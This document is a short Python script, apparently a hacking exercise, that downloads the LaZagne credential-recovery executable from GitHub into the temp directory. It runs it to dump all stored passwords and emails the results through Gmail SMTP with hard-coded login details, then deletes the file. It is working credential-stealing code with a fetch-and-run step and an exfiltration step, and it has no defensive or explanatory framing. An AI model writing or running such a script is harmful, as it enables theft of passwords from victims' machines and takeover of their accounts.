#!/usr/bin/env python
import requests as request
import subprocess
import smtplib
import os
import tempfile


def download(url):
    get_response = request.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as output_file:
        output_file.write(get_response.content)


def send_mail():
    email = "email@example.com"
    password = "superSecretPassword"
    smtp_server = "smtp.gmail.com"
    smtp_server_port = 587
    server = smtplib.SMTP(smtp_server, smtp_server_port)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, result)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
result = subprocess.check_output("lazagne.exe all -v", shell=True)
send_mail()
os.remove("lazagne.exe ")
